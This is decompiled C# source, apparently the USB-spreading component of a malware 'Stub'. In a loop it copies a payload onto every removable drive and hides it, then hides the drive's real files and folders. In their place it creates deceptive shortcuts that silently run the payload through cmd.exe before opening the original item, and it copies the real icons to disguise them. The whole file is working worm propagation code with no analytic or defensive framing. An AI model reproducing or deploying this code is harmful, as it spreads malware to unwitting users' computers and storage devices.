using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Stub;

public class USB
{
	private bool Off;

	private Thread thread;

	private string ruta;

	public USB()
	{
		Off = false;
		thread = null;
	}

	public void Start()
	{
		if (thread == null)
		{
			thread = new Thread(usbSP, 1);
			thread.Start();
		}
	}

	public void stopp()
	{
		try
		{
			thread.Abort();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void usbSP()
	{
		int try0000_dispatch = -1;
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		int num5 = default(int);
		object objectValue = default(object);
		DriveInfo[] drives = default(DriveInfo[]);
		DriveInfo driveInfo = default(DriveInfo);
		string[] files = default(string[]);
		int num6 = default(int);
		string text = default(string);
		object obj = default(object);
		object obj2 = default(object);
		string[] directories = default(string[]);
		int num7 = default(int);
		string text2 = default(string);
		object obj3 = default(object);
		object obj4 = default(object);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				checked
				{
					switch (try0000_dispatch)
					{
					default:
						num = 1;
						Off = false;
						goto IL_064f;
					case 1899:
						{
							num2 = num;
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
							int num4 = unchecked(num2 + 1);
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 4:
								goto IL_000f;
							case 5:
								goto IL_0017;
							case 6:
								goto IL_002f;
							case 7:
								goto IL_004d;
							case 8:
								goto IL_005b;
							case 9:
								goto IL_006a;
							case 10:
								goto IL_007a;
							case 11:
								goto IL_009e;
							case 12:
								goto IL_00bd;
							case 13:
								goto IL_00e2;
							case 14:
								goto IL_0134;
							case 15:
								goto IL_013f;
							case 16:
								goto IL_0163;
							case 17:
								goto IL_01a1;
							case 18:
								goto IL_01ca;
							case 19:
								goto IL_01f2;
							case 20:
								goto IL_021a;
							case 21:
								goto IL_029d;
							case 22:
								goto IL_032f;
							case 23:
								goto IL_0347;
							case 25:
								goto IL_0370;
							case 26:
								goto IL_0374;
							case 29:
								goto IL_03a2;
							case 30:
								goto IL_03a8;
							case 31:
								goto IL_03ab;
							case 32:
								goto IL_03b1;
							case 33:
								goto IL_03ba;
							case 34:
								goto IL_03e0;
							case 35:
								goto IL_03ec;
							case 36:
								goto IL_040c;
							case 37:
								goto IL_0446;
							case 38:
								goto IL_046f;
							case 39:
								goto IL_0497;
							case 40:
								goto IL_04bf;
							case 41:
								goto IL_0534;
							case 42:
								goto IL_0561;
							case 43:
								goto IL_057a;
							case 45:
								goto IL_05a1;
							case 46:
								goto IL_05a5;
							case 49:
								goto IL_05d1;
							case 50:
								goto IL_05d8;
							case 51:
								goto IL_05e1;
							case 44:
							case 47:
							case 48:
								goto IL_05ea;
							case 52:
							case 53:
								goto IL_0608;
							case 54:
								goto IL_060e;
							case 24:
							case 27:
							case 28:
								goto IL_0617;
							case 55:
								goto IL_0638;
							case 56:
								goto IL_0641;
							case 2:
							case 3:
							case 57:
								goto IL_064f;
							case 58:
								goto end_IL_0000_2;
							default:
								goto end_IL_0000;
							case 59:
								goto end_IL_0000_3;
							}
							goto default;
						}
						IL_0608:
						num5++;
						goto IL_060e;
						IL_064f:
						num = 3;
						if (Off)
						{
							break;
						}
						goto IL_000f;
						IL_000f:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_0017;
						IL_0017:
						num = 5;
						objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("wscript.shell", ""));
						goto IL_002f;
						IL_002f:
						num = 6;
						drives = DriveInfo.GetDrives();
						num5 = 0;
						goto IL_003c;
						IL_003c:
						if (num5 < drives.Length)
						{
							driveInfo = drives[num5];
							goto IL_004d;
						}
						goto IL_0638;
						IL_060e:
						num = 54;
						goto IL_003c;
						IL_004d:
						num = 7;
						if (driveInfo.IsReady)
						{
							goto IL_005b;
						}
						goto IL_0608;
						IL_005b:
						num = 8;
						if (driveInfo.DriveType == DriveType.Removable)
						{
							goto IL_006a;
						}
						goto IL_0608;
						IL_006a:
						num = 9;
						ruta = driveInfo.Name;
						goto IL_007a;
						IL_007a:
						num = 10;
						File.Copy(Settings.path2, ruta + "\\" + Settings.nameee, overwrite: true);
						goto IL_009e;
						IL_009e:
						num = 11;
						File.SetAttributes(ruta + "\\" + Settings.nameee, FileAttributes.Hidden | FileAttributes.System);
						goto IL_00bd;
						IL_00bd:
						num = 12;
						files = Directory.GetFiles(ruta);
						num6 = 0;
						goto IL_00d1;
						IL_00d1:
						if (num6 < files.Length)
						{
							text = files[num6];
							goto IL_00e2;
						}
						goto IL_03ba;
						IL_0638:
						num = 55;
						GC.Collect();
						goto IL_0641;
						IL_00e2:
						num = 13;
						if ((Operators.CompareString(Path.GetExtension(text)!.ToLower(), ".lnk", false) != 0) & (Operators.CompareString(text.ToLower(), ruta.ToLower() + Settings.nameee.ToLower(), false) != 0))
						{
							goto IL_0134;
						}
						goto IL_03ab;
						IL_0134:
						num = 14;
						File.SetAttributes(text, FileAttributes.Hidden | FileAttributes.System);
						goto IL_013f;
						IL_013f:
						num = 15;
						File.Delete(ruta + new FileInfo(text).get_Name() + ".lnk");
						goto IL_0163;
						IL_0163:
						num = 16;
						obj = NewLateBinding.LateGet(objectValue, (Type)null, "CreateShortcut", new object[1] { ruta + new FileInfo(text).get_Name() + ".lnk" }, (string[])null, (Type[])null, (bool[])null);
						goto IL_01a1;
						IL_01a1:
						num = 17;
						NewLateBinding.LateSetComplex(obj, (Type)null, "windowstyle", new object[1] { 7 }, (string[])null, (Type[])null, false, true);
						goto IL_01ca;
						IL_01ca:
						num = 18;
						NewLateBinding.LateSetComplex(obj, (Type)null, "TargetPath", new object[1] { "cmd.exe" }, (string[])null, (Type[])null, false, true);
						goto IL_01f2;
						IL_01f2:
						num = 19;
						NewLateBinding.LateSetComplex(obj, (Type)null, "WorkingDirectory", new object[1] { "" }, (string[])null, (Type[])null, false, true);
						goto IL_021a;
						IL_021a:
						num = 20;
						NewLateBinding.LateSetComplex(obj, (Type)null, "Arguments", new object[1] { "/c start " + Settings.nameee.Replace(" ", "\" \"") + "&start " + new FileInfo(text).get_Name().Replace(" ", "\" \"") + " & exit" }, (string[])null, (Type[])null, false, true);
						goto IL_029d;
						IL_029d:
						num = 21;
						obj2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "regread", new object[1] { Operators.ConcatenateObject(Operators.ConcatenateObject((object)"HKEY_LOCAL_MACHINE\\software\\classes\\", NewLateBinding.LateGet(objectValue, (Type)null, "regread", new object[1] { "HKEY_LOCAL_MACHINE\\software\\classes\\." + Strings.Split(Path.GetFileName(text), ".", -1, (CompareMethod)0)[Information.UBound((Array)Strings.Split(Path.GetFileName(text), ".", -1, (CompareMethod)0), 1)] + "\\" }, (string[])null, (Type[])null, (bool[])null)), (object)"\\defaulticon\\") }, (string[])null, (Type[])null, (bool[])null));
						goto IL_032f;
						IL_032f:
						num = 22;
						if (Strings.InStr(Conversions.ToString(obj2), ",", (CompareMethod)0) == 0)
						{
							goto IL_0347;
						}
						goto IL_0370;
						IL_0347:
						num = 23;
						NewLateBinding.LateSetComplex(obj, (Type)null, "iconlocation", new object[1] { text }, (string[])null, (Type[])null, false, true);
						goto IL_0617;
						IL_0370:
						num = 25;
						goto IL_0374;
						IL_0374:
						num = 26;
						NewLateBinding.LateSetComplex(obj, (Type)null, "iconlocation", new object[1] { RuntimeHelpers.GetObjectValue(obj2) }, (string[])null, (Type[])null, false, true);
						goto IL_0617;
						IL_0617:
						num = 28;
						NewLateBinding.LateCall(obj, (Type)null, "Save", new object[0], (string[])null, (Type[])null, (bool[])null, true);
						goto IL_03a2;
						IL_03a2:
						num = 29;
						obj2 = null;
						goto IL_03a8;
						IL_03a8:
						obj = null;
						goto IL_03ab;
						IL_03ab:
						num6++;
						goto IL_03b1;
						IL_03b1:
						num = 32;
						goto IL_00d1;
						IL_03ba:
						num = 33;
						directories = Directory.GetDirectories(ruta);
						num7 = 0;
						goto IL_03ce;
						IL_03ce:
						if (num7 < directories.Length)
						{
							text2 = directories[num7];
							goto IL_03e0;
						}
						goto IL_0608;
						IL_0641:
						num = 56;
						Thread.Sleep(5000);
						goto IL_064f;
						IL_03e0:
						num = 34;
						File.SetAttributes(text2, FileAttributes.Hidden | FileAttributes.System);
						goto IL_03ec;
						IL_03ec:
						num = 35;
						File.Delete(ruta + Path.GetFileNameWithoutExtension(text2) + " .lnk");
						goto IL_040c;
						IL_040c:
						num = 36;
						obj3 = NewLateBinding.LateGet(objectValue, (Type)null, "CreateShortcut", new object[1] { ruta + Path.GetFileNameWithoutExtension(text2) + " .lnk" }, (string[])null, (Type[])null, (bool[])null);
						goto IL_0446;
						IL_0446:
						num = 37;
						NewLateBinding.LateSetComplex(obj3, (Type)null, "windowstyle", new object[1] { 7 }, (string[])null, (Type[])null, false, true);
						goto IL_046f;
						IL_046f:
						num = 38;
						NewLateBinding.LateSetComplex(obj3, (Type)null, "TargetPath", new object[1] { "cmd.exe" }, (string[])null, (Type[])null, false, true);
						goto IL_0497;
						IL_0497:
						num = 39;
						NewLateBinding.LateSetComplex(obj3, (Type)null, "WorkingDirectory", new object[1] { "" }, (string[])null, (Type[])null, false, true);
						goto IL_04bf;
						IL_04bf:
						num = 40;
						NewLateBinding.LateSetComplex(obj3, (Type)null, "Arguments", new object[1] { "/c start " + Settings.nameee.Replace(" ", "\" \"") + "&explorer /root,\"%CD%" + new DirectoryInfo(text2).get_Name() + "\" & exit" }, (string[])null, (Type[])null, false, true);
						goto IL_0534;
						IL_0534:
						num = 41;
						obj4 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "regread", new object[1] { "HKEY_LOCAL_MACHINE\\software\\classes\\folder\\defaulticon\\" }, (string[])null, (Type[])null, (bool[])null));
						goto IL_0561;
						IL_0561:
						num = 42;
						if (Strings.InStr(Conversions.ToString(obj4), ",", (CompareMethod)0) == 0)
						{
							goto IL_057a;
						}
						goto IL_05a1;
						IL_057a:
						num = 43;
						NewLateBinding.LateSetComplex(obj3, (Type)null, "IconLocation", new object[1] { text2 }, (string[])null, (Type[])null, false, true);
						goto IL_05ea;
						IL_05a1:
						num = 45;
						goto IL_05a5;
						IL_05a5:
						num = 46;
						NewLateBinding.LateSetComplex(obj3, (Type)null, "IconLocation", new object[1] { RuntimeHelpers.GetObjectValue(obj4) }, (string[])null, (Type[])null, false, true);
						goto IL_05ea;
						IL_05ea:
						num = 48;
						NewLateBinding.LateCall(obj3, (Type)null, "Save", new object[0], (string[])null, (Type[])null, (bool[])null, true);
						goto IL_05d1;
						IL_05d1:
						num = 49;
						obj4 = null;
						goto IL_05d8;
						IL_05d8:
						obj3 = null;
						num7++;
						goto IL_05e1;
						IL_05e1:
						num = 51;
						goto IL_03ce;
						end_IL_0000_2:
						break;
					}
					num = 58;
					thread = null;
					break;
				}
				end_IL_0000:;
			}
			catch (object obj5) when (obj5 is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj5);
				try0000_dispatch = 1899;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
